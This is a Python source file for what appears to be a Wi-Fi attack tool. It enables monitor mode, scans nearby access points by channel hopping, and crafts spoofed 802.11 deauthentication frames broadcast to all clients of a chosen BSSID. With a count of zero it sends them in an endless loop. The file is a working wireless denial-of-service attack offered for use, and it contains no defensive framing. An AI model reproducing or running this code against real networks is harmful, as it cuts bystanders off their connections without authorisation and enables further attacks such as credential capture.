#!/usr/bin/env python3

from scapy.all import *
from threading import Thread
# from .begin import execute_commands
from prettytable import PrettyTable
import netifaces

class mon:
    def __init__(self, interface):
        self.interface = interface

    def make_monitor(self):
        command = [
            "iw dev {} interface add pnumbra-mon0 type monitor".format(self.interface)
        ]
        execute_commands(command)
        
    @staticmethod
    def mon_iface_upper():
        addr = netifaces.ifaddresses("pnumbra-mon0")
        if not netifaces.AF_INET in addr:
            execute_commands(['ifconfig pnumbra-mon0 up'])
    
    @staticmethod
    def disable_mon_mode():
        execute_commands(["iw dev pnumbra-mon0 del"])

class Deauth:
    
    @staticmethod
    def make_packet(bssid):
        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
        # stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        return packet

    def send_packet(self, packet, interface, counts):
        if counts == 0:
            loop = 1
            counts = None
        else:
            loop = 0
        sendp(packet, inter=0.1, count=counts, loop=loop, iface=interface, verbose=0)
    
class Dump:
    def __init__(self):
        self.dictionary = dict()
        self.list = list()

    def callback(self, packet):
        if packet.haslayer(Dot11Beacon):
		    # extract the MAC address of the network
            bssid = packet[Dot11].addr2
			# get the name of it
            ssid = packet[Dot11Elt].info.decode()
            try:
                dbm_signal = packet.dBm_AntSignal
            except:
                dbm_signal = "N/A"
			# extract network stats
            stats = packet[Dot11Beacon].network_stats()
			# get the channel of the AP
            channel = stats.get("channel")
			# get the crypto
            crypto = stats.get("crypto")
            global num
            self.dictionary[bssid] = [bssid, ssid, dbm_signal, channel, crypto]
	
    @staticmethod
    def change_channel(interface):
        ch = 1
        global dead
        while not dead:
            os.system(f"iwconfig {interface} channel {ch}")
	        # switch channel from 1 to 14 each 0.5s
            ch = ch % 14 + 1
            time.sleep(0.5)

    @staticmethod
    def daemon(target, params):
        app = Thread(target=target, args=params)
        app.daemon = True
        app.start()
    
    def send_packet(self, interface, timeout):
        global dead
        dead = False
        self.daemon(self.change_channel, [interface])
        sniff(prn=self.callback, iface=interface, timeout=timeout)
        dead = True
		# print(self.networks)
        x = PrettyTable()
        x.field_names = ["No", "BSSID", "SSID", "PWR", "CH", "ENC"]
        for key, value in self.dictionary.items():
            x.add_row(value)
        return x